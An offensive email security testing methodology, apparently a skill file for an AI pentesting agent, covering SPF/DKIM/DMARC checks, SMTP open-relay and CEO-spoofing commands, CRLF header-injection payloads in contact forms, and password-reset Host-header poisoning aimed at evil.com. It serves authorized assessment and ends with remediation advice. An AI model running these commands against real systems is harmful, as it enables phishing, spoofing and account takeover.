---
name: performing-email-security-testing
description: Offensive email security assessment covering SMTP open relay, SPF/DKIM/DMARC bypass, email header injection, and email-based attack vectors during authorized penetration tests.
domain: cybersecurity
subdomain: web-application-security
tags:
- penetration-testing
- email-security
- smtp-testing
- spf-bypass
- dmarc-testing
- email-spoofing
- header-injection
version: '1.0'
author: Krishna Kumar (xalgord)
license: Apache-2.0
---

# Performing Email Security Testing

## When to Use

- During Phase 15 (Email Security Testing) of the methodology
- When the target has email infrastructure (MX records, webmail, contact forms)
- When testing for email spoofing or phishing susceptibility
- When the application handles email input (forms, notifications, password resets)
- When testing email-based authentication flows (magic links, OTP via email)

### How to CONFIRM a Hit (avoid false negatives)

- **Positive signal**: a spoofed message actually **passes/bypasses SPF, DKIM, and DMARC and is delivered** to the inbox; an open relay actually **delivers** a third-party message; or CRLF header injection actually **adds a recipient/header** in the received mail.
- Confirm by delivery to your controlled test inbox (agentmail) and by reading the **received `Authentication-Results` headers** (spf=pass/none, dmarc=pass/none) — a DNS record showing `~all`/`p=none` is suggestive but delivery is the proof.
- An SMTP `250 OK` alone is NOT a hit (it may be quarantined or silently dropped); one rejection is NOT a clean negative until policy and relay paths are exercised.
- Do NOT conclude "not vulnerable" until you have:
  - Checked SPF (`~all`/`?all`/`+all`/absent), DMARC (`p=none`/absent, weak `sp=`/`pct=`), and DKIM selectors — then **sent a real spoof** to confirm inbox delivery.
  - Tried **open-relay** with an external `MAIL FROM` and confirmed delivery, on ports 25/465/587.
  - Tried **header injection** via web forms (all CRLF encodings/fields) and confirmed an injected `Bcc`/`Cc` arrived.
  - Tested **Host-header poisoning** of reset links (verify the link in the delivered email uses the attacker host) and token predictability/reuse.

## Prerequisites

- **Authorization**: Written scope covering email infrastructure testing
- **agentmail**: ALWAYS use agentmail for test addresses (never use external emails)
- **dig/nslookup**: DNS record enumeration
- **swaks**: Swiss Army Knife for SMTP (`apt install swaks`)
- **nmap**: For SMTP service enumeration
- **curl**: For testing web-to-email functionality
- **openssl**: For TLS/STARTTLS testing

## Workflow

### Step 1: Email Infrastructure Enumeration

Map the target's email ecosystem before testing.

```bash
# === MX RECORD DISCOVERY ===
dig MX target.example.com +short
# Example output:
# 10 mx1.target.example.com.
# 20 mx2.target.example.com.

# === SPF RECORD CHECK ===
dig TXT target.example.com +short | grep "v=spf1"
# Analyze SPF strictness:
# ~all = soft fail (can be bypassed)
# -all = hard fail (strict, good)
# ?all = neutral (no enforcement)
# +all = allow all (MISCONFIGURATION)
# No SPF = NO protection

# === DMARC RECORD CHECK ===
dig TXT _dmarc.target.example.com +short
# Analyze DMARC policy:
# p=none → monitoring only, no enforcement (WEAK)
# p=quarantine → suspicious mail goes to spam
# p=reject → spoofed mail is blocked (STRONG)
# No DMARC record → NO protection

# === DKIM RECORD CHECK ===
# Common DKIM selectors to try
for SELECTOR in default google s1 s2 k1 selector1 selector2 dkim mail; do
  RESULT=$(dig TXT ${SELECTOR}._domainkey.target.example.com +short 2>/dev/null)
  if [ -n "$RESULT" ]; then
    echo "DKIM found: ${SELECTOR}._domainkey.target.example.com"
    echo "$RESULT"
  fi
done

# === SMTP SERVICE ENUMERATION ===
for MX in $(dig MX target.example.com +short | awk '{print $2}'); do
  echo "=== $MX ==="
  nmap -sV -p 25,465,587 "$MX" --script smtp-commands,smtp-enum-users
done

# === WEBMAIL DISCOVERY ===
for PREFIX in mail webmail email owa outlook autodiscover; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" "https://${PREFIX}.target.example.com" 2>/dev/null)
  if [ "$CODE" != "000" ] && [ "$CODE" != "404" ]; then
    echo "Found: https://${PREFIX}.target.example.com → HTTP $CODE"
  fi
done
```

### Step 2: SMTP Open Relay Testing

Test if the mail server allows unauthenticated relay.

```bash
# === IMPORTANT: Use agentmail for all test addresses ===
# Create test inbox first:
# agentmail action=create_inbox name=smtp_relay_test

# === MANUAL SMTP RELAY TEST ===
# Connect to target SMTP server
# WARNING: Only test with agentmail addresses as recipient
(
  sleep 1; echo "EHLO test.example.com"
  sleep 1; echo "MAIL FROM:<test@external-domain.com>"
  sleep 1; echo "RCPT TO:<YOUR_AGENTMAIL_ADDRESS>"
  sleep 1; echo "DATA"
  sleep 1; echo "Subject: Open Relay Test"
  sleep 1; echo ""
  sleep 1; echo "This is an open relay test."
  sleep 1; echo "."
  sleep 1; echo "QUIT"
) | openssl s_client -connect mx1.target.example.com:25 -starttls smtp 2>/dev/null

# === SWAKS RELAY TEST (easier) ===
swaks --to YOUR_AGENTMAIL_ADDRESS \
  --from spoofed@external-domain.com \
  --server mx1.target.example.com \
  --port 25 \
  --body "Open relay test - authorized pentest" \
  --header "Subject: Open Relay Test"

# Check for relay results:
# 250 OK → OPEN RELAY (Critical vulnerability)
# 550/554 Relaying denied → Properly configured
# 421 → Rate limited or blocked

# === VERIFY: Check if email was delivered ===
# agentmail action=wait_for_email inbox_id=INBOX_ID subject="Open Relay" timeout=120
```

### Step 3: Email Spoofing Assessment

Test if the domain is susceptible to email spoofing.

```bash
# === SPF BYPASS TESTING ===

# Test 1: No SPF record → complete spoofing possible
SPF=$(dig TXT target.example.com +short | grep "v=spf1")
if [ -z "$SPF" ]; then
  echo "CRITICAL: No SPF record — domain is fully spoofable"
fi

# Test 2: SPF with ~all (softfail) → spoofing may work
echo "$SPF" | grep "~all" && echo "WARN: SPF softfail — spoofing may bypass filters"

# Test 3: SPF with +all → allows any sender
echo "$SPF" | grep "+all" && echo "CRITICAL: SPF +all — explicitly allows spoofing"

# === DMARC BYPASS ASSESSMENT ===
DMARC=$(dig TXT _dmarc.target.example.com +short)

if [ -z "$DMARC" ]; then
  echo "CRITICAL: No DMARC record — no email authentication enforcement"
elif echo "$DMARC" | grep -q "p=none"; then
  echo "WARN: DMARC p=none — monitoring only, spoofed email will be delivered"
elif echo "$DMARC" | grep -q "p=quarantine"; then
  echo "INFO: DMARC p=quarantine — spoofed email goes to spam (partial protection)"
elif echo "$DMARC" | grep -q "p=reject"; then
  echo "GOOD: DMARC p=reject — spoofed email will be blocked"
fi

# Check DMARC subdomain policy
echo "$DMARC" | grep -oP 'sp=\w+' || echo "WARN: No subdomain policy — defaults to p= value"

# Check DMARC percentage
echo "$DMARC" | grep -oP 'pct=\d+' || echo "INFO: No pct tag — defaults to 100%"

# === PRACTICAL SPOOFING TEST (to your own agentmail) ===
swaks --to YOUR_AGENTMAIL_ADDRESS \
  --from ceo@target.example.com \
  --server mx1.target.example.com \
  --body "Spoofing test - authorized assessment" \
  --header "Subject: SPF/DMARC Spoofing Test" \
  --header "Reply-To: attacker@evil.com"

# Check delivery + analyze received headers for SPF/DMARC results
# agentmail action=wait_for_email inbox_id=INBOX_ID subject="Spoofing Test" timeout=120
```

### Step 4: Email Header Injection via Web Forms

Test web application email functionality for header injection.

```bash
# === CONTACT FORM HEADER INJECTION ===
# Target: forms that send emails (contact, feedback, newsletter signup)

# Test 1: CRLF injection in email field
curl -s -X POST "https://target.example.com/api/contact" \
  -H "Content-Type: application/json" \
  -d '{
    "email": "test@example.com\r\nBcc: YOUR_AGENTMAIL_ADDRESS",
    "message": "Header injection test"
  }'

# Test 2: Newline injection in name/subject fields
curl -s -X POST "https://target.example.com/api/contact" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Test\r\nBcc: YOUR_AGENTMAIL_ADDRESS",
    "email": "test@example.com",
    "message": "Header injection test"
  }'

# Test 3: CC/BCC injection via additional headers
curl -s -X POST "https://target.example.com/api/contact" \
  -H "Content-Type: application/json" \
  -d '{
    "email": "test@example.com%0ACc:YOUR_AGENTMAIL_ADDRESS",
    "message": "URL-encoded header injection test"
  }'

# Test 4: Body injection (multi-part)
curl -s -X POST "https://target.example.com/api/contact" \
  -H "Content-Type: application/json" \
  -d '{
    "email": "test@example.com",
    "message": "Normal message\r\n\r\nContent-Type: text/html\r\n\r\n<h1>Injected HTML</h1>"
  }'

# === VERIFY: Check if injected headers were processed ===
# agentmail action=wait_for_email inbox_id=INBOX_ID timeout=120
```

### Step 5: Password Reset Email Security

Test for vulnerabilities in password reset flows.

```bash
# === HOST HEADER POISONING IN PASSWORD RESET ===
# Attempt to redirect password reset links to attacker domain
curl -s -X POST "https://target.example.com/api/forgot-password" \
  -H "Host: evil.com" \
  -H "Content-Type: application/json" \
  -d '{"email": "victim@target.example.com"}'

# Check if reset link uses evil.com as base URL
# agentmail action=wait_for_email inbox_id=INBOX_ID subject="password" timeout=120

# === RESET TOKEN ANALYSIS ===
# Request multiple reset tokens and analyze patterns

for i in $(seq 1 5); do
  curl -s -X POST "https://target.example.com/api/forgot-password" \
    -H "Content-Type: application/json" \
    -d "{\"email\": \"$AGENTMAIL_ADDRESS\"}"
  sleep 2
done

# Collect tokens and check for:
# - Sequential/predictable tokens
# - Short tokens (< 32 chars)
# - Tokens that don't expire
# - Tokens reusable after password change

# === USER ENUMERATION VIA RESET ===
# Check if different responses for valid vs invalid emails
for EMAIL in "existing@target.example.com" "nonexistent@target.example.com" \
  "admin@target.example.com" "root@target.example.com"; do
  echo -n "$EMAIL → "
  curl -s -o /dev/null -w "%{http_code} %{size_download}" \
    -X POST "https://target.example.com/api/forgot-password" \
    -H "Content-Type: application/json" \
    -d "{\"email\": \"$EMAIL\"}"
  echo
done
# Different response codes/sizes → user enumeration vulnerability
```

### Step 6: SMTP STARTTLS and Encryption Testing

```bash
# === TLS CONFIGURATION CHECK ===
for PORT in 25 465 587; do
  echo "=== Port $PORT ==="
  echo "QUIT" | openssl s_client -connect mx1.target.example.com:$PORT \
    -starttls smtp 2>/dev/null | \
    grep -E "Protocol|Cipher|Server certificate"
done

# === CHECK FOR DOWNGRADE ATTACKS ===
# Test if server accepts non-TLS connections on port 25
(echo "EHLO test"; sleep 1; echo "QUIT") | \
  nc mx1.target.example.com 25 2>/dev/null | grep -i "STARTTLS"

# If STARTTLS is optional (not enforced) → susceptible to downgrade
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| **SPF** | Sender Policy Framework — specifies which IPs can send email for a domain |
| **DKIM** | DomainKeys Identified Mail — cryptographic signature verifying email sender |
| **DMARC** | Domain-based Message Authentication — policy for handling SPF/DKIM failures |
| **Open Relay** | SMTP server that relays email from unauthenticated senders (Critical) |
| **Email Header Injection** | Injecting CRLF to add Bcc/Cc headers via web forms |
| **Host Header Poisoning** | Manipulating Host header to redirect password reset links |
| **STARTTLS Downgrade** | Forcing SMTP connection to plaintext by stripping TLS negotiation |

## Common Scenarios

| Scenario | Impact | Proof |
|----------|--------|-------|
| No SPF record | Anyone can spoof emails from domain | `dig TXT domain` shows no v=spf1 |
| DMARC p=none | Spoofed emails delivered to inbox | Email delivered to agentmail with spoofed From |
| Open SMTP relay | Spam/phishing relay through target server | Email delivered via relay to agentmail |
| Header injection in contact form | Attacker controls email recipients | BCC injection delivers to agentmail |
| Predictable reset tokens | Account takeover via token prediction | Sequential tokens with < 32 bit entropy |
| Host header password reset poisoning | Reset link points to attacker domain | Reset email contains evil.com URL |

## Output Format

```
## Email Security Finding

**Vulnerability**: Missing DMARC Policy — Domain Spoofable
**Severity**: Medium (CVSS 5.3)
**Location**: _dmarc.target.example.com (DNS)
**Type**: Email Authentication Misconfiguration

### Evidence
- SPF Record: v=spf1 include:_spf.google.com ~all (SOFTFAIL)
- DMARC Record: NONE (no _dmarc TXT record exists)
- DKIM: Selector 'google' found with valid key

### Exploitation Proof
Successfully sent spoofed email as ceo@target.example.com
to test inbox. Email was delivered without any authentication
warnings because no DMARC policy exists to enforce SPF/DKIM.

### Impact
- Attackers can send phishing emails appearing to come from target.example.com
- No mechanism to reject or quarantine spoofed messages
- Combined with social engineering, enables targeted spearphishing

### Recommendation
1. Implement DMARC: _dmarc.target.example.com TXT "v=DMARC1; p=reject; rua=mailto:dmarc@target.example.com"
2. Change SPF from ~all (softfail) to -all (hardfail)
3. Enable DMARC reporting to monitor authentication failures
4. Consider implementing BIMI for visual email authentication
```
